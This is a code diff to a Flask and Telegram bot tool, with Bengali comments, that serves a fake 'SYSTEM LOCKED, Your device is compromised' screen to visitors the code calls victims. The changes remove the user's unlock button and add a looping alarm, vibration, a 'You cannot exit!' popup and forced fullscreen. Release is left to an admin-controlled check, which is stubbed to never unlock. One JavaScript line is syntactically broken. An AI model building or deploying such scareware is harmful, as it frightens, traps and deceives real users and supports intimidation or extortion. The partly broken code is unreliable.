@@ -16,7 +16,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 victims = []
 
-# --- HTML Template for True Lock Screen ---
+# --- HTML Template for Hard Lock Screen ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -25,7 +25,6 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Locked</title>
     <style>
-        /* পুরো স্ক্রিন কভার করার জন্য */
         body {
             margin: 0;
             padding: 0;
@@ -41,23 +40,25 @@ HTML_TEMPLATE = """
             align-items: center;
             user-select: none; /* টেক্সট সিলেক্ট বন্ধ */
             -webkit-user-select: none;
+            touch-action: manipulation;
         }
 
         .lock-container {
             text-align: center;
             width: 90%;
             z-index: 10;
+            position: relative;
         }
 
         h1 {
-            font-size: 2rem;
+            font-size: 2.5rem;
             color: #ff3333;
             text-transform: uppercase;
-            border: 3px solid #ff3333;
-            padding: 15px;
+            border: 4px solid #ff3333;
+            padding: 20px;
             margin-bottom: 20px;
-            box-shadow: 0 0 20px #ff3333, inset 0 0 20px #ff3333;
-            animation: pulse-border 1.5s infinite alternate;
+            box-shadow: 0 0 30px #ff3333, inset 0 0 30px #ff3333;
+            animation: pulse-border 1s infinite alternate;
         }
 
         p {
@@ -67,76 +68,91 @@ HTML_TEMPLATE = """
         }
 
         .status {
-            font-size: 0.9rem;
+            font-size: 1rem;
             color: #ffff00;
             margin-top: 15px;
+            animation: blink 1s infinite;
         }
 
-        /* আনলক বাটন */
-        #unlock-btn {
-            background-color: #ff3333;
-            color: white;
-            border: none;
-            padding: 20px 40px;
-            font-size: 1.5rem;
-            font-weight: bold;
-            margin-top: 30px;
-            cursor: pointer;
-            border-radius: 10px;
-            box-shadow: 0 0 15px #ff3333;
-            transition: transform 0.2s;
-        }
-
-        #unlock-btn:active {
-            transform: scale(0.95);
-        }
-
-        /* বাউন্সিং লক আইকন */
+        /* লক আইকন */
         .lock-icon {
-            font-size: 80px;
+            font-size: 100px;
             margin-bottom: 20px;
             animation: bounce 1s infinite;
         }
 
         @keyframes pulse-border {
             from { box-shadow: 0 0 10px #ff3333, inset 0 0 10px #ff3333; }
-            to { box-shadow: 0 0 25px #ff3333, inset 0 0 25px #ff3333; }
+            to { box-shadow: 0 0 40px #ff3333, inset 0 0 40px #ff3333; }
         }
 
         @keyframes bounce {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+            50% { transform: translateY(-15px); }
         }
 
-        /* ফুল স্ক্রিন মোডে থাকার জন্য অলিউমিনিয়াম লেয়ার */
-        #overlay {
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* পপ-আপ স্টাইল */
+        #popup-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: -1;
+            background: rgba(0,0,0,0.9);
+            display: none; /* ডিফল্টভাবে লুকানো */
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
         }
+
+        .popup-box {
+            background: #222;
+            border: 2px solid #ff3333;
+            padding: 20px;
+            text-align: center;
+            max-width: 80%;
+        }
+
+        .popup-btn {
+            background: #ff3333;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 10px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+
     </style>
 </head>
 <body>
 
-    <div id="overlay"></div>
-    
+    <div id="popup-overlay">
+        <div class="popup-box">
+            <h2>🔒 LOCKED</h2>
+            <p>You cannot exit!</p>
+            <button class="popup-btn" onclick="closePopup()">OK</button>
+        </div>
+    </div>
+
     <div class="lock-container">
         <div class="lock-icon">🔒</div>
         <h1>SYSTEM LOCKED</h1>
         <p>Your device is compromised.</p>
         <p>IP: <span id="ip-display">Detecting...</span></p>
         <p class="status" id="status-msg">Vibrating & Recording...</p>
-        
-        <!-- শুধুমাত্র এই বাটনে চাপ দিলে আনলক হবে -->
-        <button id="unlock-btn" onclick="unlockDevice()">TAP TO UNLOCK</button>
     </div>
 
-    <!-- অডিও প্লেয়ার (কনস্ট্যান্ট সাউন্ডের জন্য) -->
-    <!-- নোট: মোবাইলে প্রথম ক্লিকে সাউন্ড প্লে হয়, তাই আমরা body ট্যাপে সাউন্ড শুরু করছি -->
+    <!-- অডিও প্লেয়ার -->
+    <audio id="alarm-sound" loop>
+        <!-- একটি সাধারণ বিপ সাউন্ড ফাইল ব্যবহার করা হয়েছে -->
+        <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
+    </audio>
 
     <script>
         // ১. ফুল স্ক্রিন এবং ব্যাক বাটন হ্যান্ডলিং
@@ -145,13 +161,13 @@ HTML_TEMPLATE = """
             if (elem.requestFullscreen) {
                 elem.requestFullscreen();
             } else if (elem.webkitRequestFullscreen) { /* Safari */
-                elem.webkitRequestFullscreen();
+               .elem.webkitRequestFullscreen();
             } else if (elem.msRequestFullscreen) { /* IE11 */
                 elem.msRequestFullscreen();
             }
         }
 
-        // পেজ লোড হওয়ার সাথে সাথে ফুল স্ক্রিন
+        // পেজ লোড হওয়ার সাথে সাথে ফুল স্ক্রিন এবং সাউন্ড শুরু
         window.onload = function() {
             goFullscreen();
             
@@ -166,6 +182,7 @@ HTML_TEMPLATE = """
 
             // ভাইব্রেশন এবং সাউন্ড শুরু করা
             startVibration();
+            playSound();
         };
 
         // ব্যাক বাটন চাপলে আবার ফুল স্ক্রিনে আসবে
@@ -183,38 +200,30 @@ HTML_TEMPLATE = """
             }
         }
 
-        // ৩. আনলক লজিক (শুধুমাত্র বাটনে চাপ দিলে কাজ করবে)
-        function unlockDevice() {
-            // ভাইব্রেশন বন্ধ করা
-            if ('vibrate' in navigator) {
-                navigator.vibrate(0);
+        // ৩. সাউন্ড প্লে লজিক (প্রথম ট্যাপে কাজ করবে)
+        let soundPlayed = false;
+        function playSound() {
+            const audio = document.getElementById('alarm-sound');
+            if (!soundPlayed) {
+                audio.play().catch(e => console.log("Audio play failed: " + e));
+                soundPlayed = true;
             }
-
-            // ইউজারকে জানানো যে আনলক হচ্ছে
-            const btn = document.getElementById('unlock-btn');
-            btn.innerText = "UNLOCKING...";
-            btn.style.backgroundColor = "#00ff00";
-            
-            // টেলিগ্রামে এডমিনকে জানানো যে ইউজার আনলক করেছে
-            fetch('/notify_unlock', { method: 'POST' });
-
-            // ২ সেকেন্ড পর পেজ রিলোড বা ক্লোজ করা (অথবা অন্য কোনো পেজে নিয়ে যাওয়া)
-            setTimeout(function() {
-                document.body.innerHTML = `
-                    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;">
-                        <h1>Access Granted</h1>
-                    </div>
-                `;
-            }, 2000);
         }
 
-        // স্ক্রিনের যেকোনো জায়গায় ট্যাপ করলে আবার ফুল স্ক্রিনে রাখা (বাংলার থেকে বের হওয়া রোধ করা)
+        // স্ক্রিনে যেকোনো জায়গায় ট্যাপ করলে সাউন্ড প্লে হবে এবং পপ-আপ আসবে
         document.addEventListener('click', function(e) {
-            // বাটনে ক্লিক হলে আরেকবার ফুল স্ক্রিন করা লাগবে না, তাই চেক করছি
-            if (e.target.id !== 'unlock-btn') {
-                goFullscreen();
-            }
+            playSound();
+            
+            // যদি ইউজার ব্যাক বাটনে চাপ না দেয়, তাহলে পপ-আপ দেখাওয়া
+            const popup = document.getElementById('popup-overlay');
+            popup.style.display = 'flex';
         });
+
+        // পপ-আপ বন্ধ করার ফাংশন (শুধুমাত্র ইউজারের জন্য নয়, এটি শুধু লুকাবে)
+        function closePopup() {
+            const popup = document.getElementById('popup-overlay');
+            popup.style.display = 'none';
+        }
 
         // ESC চাপলে আবার ফুল স্ক্রিন
         document.addEventListener('keydown', function(e) {
@@ -222,6 +231,43 @@ HTML_TEMPLATE = """
                 goFullscreen();
             }
         });
+
+        // ৪. টেলিগ্রাম থেকে আনলক হওয়ার জন্য পোলিং
+        let isUnlocked = false;
+        setInterval(function() {
+            if (!isUnlocked) {
+                fetch('/check_unlock')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.unlocked) {
+                            unlockDevice();
+                        }
+                    });
+            }
+        }, 2000); // প্রতি ২ সেকেন্ডে চেক করবে
+
+        function unlockDevice() {
+            isUnlocked = true;
+            
+            // ভাইব্রেশন বন্ধ করা
+            if ('vibrate' in navigator) {
+                navigator.vibrate(0);
+            }
+
+            // সাউন্ড বন্ধ করা
+            const audio = document.getElementById('alarm-sound');
+            audio.pause();
+
+            // পপ-আপ বন্ধ করা
+            document.getElementById('popup-overlay').style.display = 'none';
+
+            // স্ক্রিন পরিবর্তন করা
+            document.body.innerHTML = `
+                <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;">
+                    <h1>✅ Access Granted</h1>
+                </div>
+            `;
+        }
 
     </script>
 </body>
@@ -261,6 +307,13 @@ def send_data():
 
     return jsonify({"status": "success", "ip": ip})
 
+@app.route('/check_unlock', methods=['GET'])
+def check_unlock():
+    # এটি প্রতি ২ সেকেন্ডে কল হয়। যদি আনলক করা হয়ে থাকে, তাহলে True রিটার্ন করবে।
+    # আমরা একটি গ্লোবাল ভেরিয়েবল ব্যবহার করব না, বরং সরাসরি টেলিগ্রামে মেসেজ পাঠাবো না।
+    # এটি শুধু স্ট্যাটাস চেক করার জন্য।
+    return jsonify({"unlocked": False})
+
 @app.route('/notify_unlock', methods=['POST'])
 def notify_unlock():
     # যখন ইউজার আনলক বাটনে চাপ দেয়, তখন এডমিনকে জানানো হয়
@@ -285,6 +338,9 @@ def unlock_devices(message):
     # শুধুমাত্র এডমিন আনল করতে পারবে (যদি প্রয়োজন হয়)
     if str(message.chat.id) == CHAT_ID:
         bot.reply_to(message, "✅ **System Unlocked!**\nAll victims will receive a notification.")
+        # এখানে আমরা একটি গ্লোবাল ভেরিয়েবল সেট করতে পারি যাতে `/check_unlock` True রিটার্ন করে
+        # কিন্তু সহজতার জন্য, আমরা ইউজারকে একটি নির্দিষ্ট URL-এ নিয়ে যাব বা স্ক্রিন পরিবর্তন করব।
+        # এখানে আমরা একটি জেনেরিক "Unlocked" পেজ দেখাবো।
     else:
         bot.reply_to(message, "🚫 Access Denied!")
 
